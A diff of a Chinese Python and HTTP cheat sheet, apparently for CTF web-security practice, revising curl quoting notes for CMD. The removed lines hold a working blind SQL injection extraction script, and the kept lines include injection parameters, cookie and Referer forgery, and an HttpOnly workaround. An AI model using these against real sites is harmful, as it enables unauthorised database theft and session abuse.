@@ -1,12 +1,15 @@
-# Python + HTTP 速查
+# Python + HTTP 速查 v2
 
 > 用法：写脚本/看请求不记得了 → 翻对应部分
+> 命令环境：**CMD**（curl.exe；PowerShell 场景见第 9 节尾注）
+> 验证标注：✓(YYYY-MM-DD)=当日实弹；未标注 = 教材知识
+> 关联：盲注脚本唯一权威版本 = **SQL 注入速查 第八章**（本表只留指针，不维护副本）；CMD 的 % 与 findstr 坑 = **黑盒开局速查 第 3 节**
 
 ========================================================
 # Python 速查
 ========================================================
 
-## 1. 发请求（requests）
+## 1. 发请求（requests）✓(2026-08-30 实弹)
 
 ```python
 import requests
@@ -14,7 +17,7 @@ import requests
 # GET
 resp = requests.get('http://target/?id=1').text
 
-# GET 带参数（自动编码）
+# GET 带参数（自动编码,不用自己拼 URL）
 resp = requests.get('http://target/', params={'id': '1 and 1=1'}).text
 
 # POST 表单
@@ -35,45 +38,12 @@ ord('f')                  # 字符→数字：102
 str(5)                    # 数字→字符串
 '%d' % 5                  # 占位符填值：'5'
 '%s和%s' % (a, b)         # 多个占位符
-"f'{(1+1)}'"              # f-string 插值（Python3.6+）
+f'结果:{1+1}'             # f-string 插值（Python3.6+）
 ```
 
-## 3. 盲注脚本骨架（改子查询就能用）
+## 3. 盲注脚本骨架
 
-```python
-import requests, time
-
-URL = 'http://target/?id='
-
-def ask(cond):   # 布尔版：页面文字
-    return '正常关键字' in requests.get(URL + '1/**/and/**/' + cond, timeout=10).text
-
-def ask_time(cond):   # 时间版：响应耗时
-    t0 = time.time()
-    try: requests.get(URL + '1 and if(' + cond + ',sleep(1),0)', timeout=10)
-    except Exception: pass
-    return time.time() - t0 > 0.6
-
-def extract(subq, stop='}'):
-    out = ''
-    for pos in range(1, 60):
-        lo, hi = 32, 127
-        while lo < hi:
-            mid = (lo + hi) // 2
-            if ask('ascii(substr((%s),%d,1))>%d' % (subq, pos, mid)):
-                lo = mid + 1
-            else: hi = mid
-        ch = chr(lo)
-        if ch == ' ': break
-        out += ch
-        if ch == stop: break
-    return out
-
-# 用法示例
-# extract('database()')
-# extract('table_name from information_schema.tables where table_schema=database() limit 0,1')
-# extract('flag from flag_table')
-```
+**唯一权威版本在 SQL 注入速查 第八章**（含：重试 3 次硬退、超时不判真、length 参数、ASCII 界注、POST/Cookie/请求头注入点的只换一行的差异块）。本表不维护副本——改那一份，两边才不会越改越岔。
 
 ## 4. 报错排查（Python）
 
@@ -134,24 +104,25 @@ def extract(subq, stop='}'):
 | Content-Type | 请求体格式 | 改类型绕过解析 |
 | Host | 目标主机 | Host 头注入 |
 
-## 9. curl 速查（PowerShell 里用 curl.exe！）
+## 9. curl 速查 ✓(2026-08-30 CMD 全形态实弹)
 
-```powershell
-curl.exe -X POST http://x/            # 指定方法
-curl.exe -d 'a=1&b=2' http://x/       # POST 表单数据
-curl.exe -H 'User-Agent: x' http://x/ # 自定义头
-curl.exe -b 'role=admin' http://x/    # 带 Cookie
-curl.exe -c cookies.txt http://x/     # 存 Cookie 到文件
-curl.exe -e 'http://x/' http://x/     # 伪造 Referer
-curl.exe -v http://x/                 # 显示完整请求响应
-curl.exe -L http://x/                 # 跟随重定向
-curl.exe -o 文件 http://x/            # 保存响应到文件
+```
+curl.exe -X POST http://x/            指定方法
+curl.exe -d "a=1&b=2" http://x/       POST 表单数据(CMD 双引号保护 &,别用单引号!)
+curl.exe -H "User-Agent: x" http://x/ 自定义头
+curl.exe -b "role=admin" http://x/    带 Cookie
+curl.exe -c cookies.txt http://x/     存 Cookie 到文件
+curl.exe -e "http://x/" http://x/     伪造 Referer
+curl.exe -v http://x/                 显示完整请求响应
+curl.exe -L http://x/                 跟随重定向(✓ 实测跟 302)
+curl.exe -o 文件 http://x/            保存响应到文件(CMD 黑洞文件是 NUL)
 ```
 
 **坑**：
-- PowerShell 里 curl 是 Invoke-WebRequest 别名 → 必须用 curl.exe
-- 双引号里的 & 会报错 → 参数用单引号包
-- URL 里的特殊字符要编码：空格 %20、# %23、单引号 %27、; %3B、| %7C
+- **CMD 只有双引号有保护力**，单引号是普通字符——老版这条表写"参数用单引号包"是 PowerShell 的习惯，**CMD 里照做会把引号原样发出去**（2026-08-30 更正）
+- CMD 的 `%` 与 findstr 中文坑 → 黑盒开局速查 第 3 节（批处理文件里 % 要双写 %%）
+- URL 里的特殊字符要编码：空格 %20、# %23、单引号 %27、; %3B、| %7C、& %26
+- 若临时在 PowerShell：curl 是 Invoke-WebRequest 别名，认准 curl.exe（.exe 后缀两个 shell 都稳）
 
 ## 10. Cookie 与 Session
 
@@ -160,7 +131,7 @@ curl.exe -o 文件 http://x/            # 保存响应到文件
 | Cookie | 浏览器 | 明文键值对 | 能，直接改 |
 | Session | 服务器 | 一串随机 id | 不能改内容，可偷/爆破 |
 
-**HttpOnly**：JS 读不到（防 XSS 偷 Cookie）
+**HttpOnly**：JS 读不到（防 XSS 偷 Cookie）——偷不到就换思路：让受害者浏览器自己发同源请求（NSSCTF paper 题 2026-08-30 实战）
 
 ## 11. URL 编码
 
@@ -175,7 +146,7 @@ curl.exe -o 文件 http://x/            # 保存响应到文件
 $_GET['x']            // URL 参数 ?x=...
 $_POST['x']           // POST 表单参数
 $_COOKIE['x']         // Cookie
-$_SERVER['HTTP_UA']   // 请求头（HTTP_ + 大写 + 下划线）
+$_SERVER['HTTP_USER_AGENT']   // 请求头 = HTTP_ + 大写 + 横线转下划线(User-Agent→HTTP_USER_AGENT)
 $_SERVER['REQUEST_METHOD']  // 方法
 $_FILES['f']          // 上传的文件
 ```
@@ -184,4 +155,4 @@ $_FILES['f']          // 上传的文件
 
 ## 心法
 
-> 请求头都可伪造 ｜ 先 F12 看请求再动手 ｜ curl.exe 记得带 .exe ｜ 编码符号别忘 %
+> 请求头都可伪造 ｜ 先 F12 看请求再动手 ｜ CMD 只有双引号 ｜ 编码符号别忘 % ｜ 盲注脚本只认 SQL 表第八章一个版本
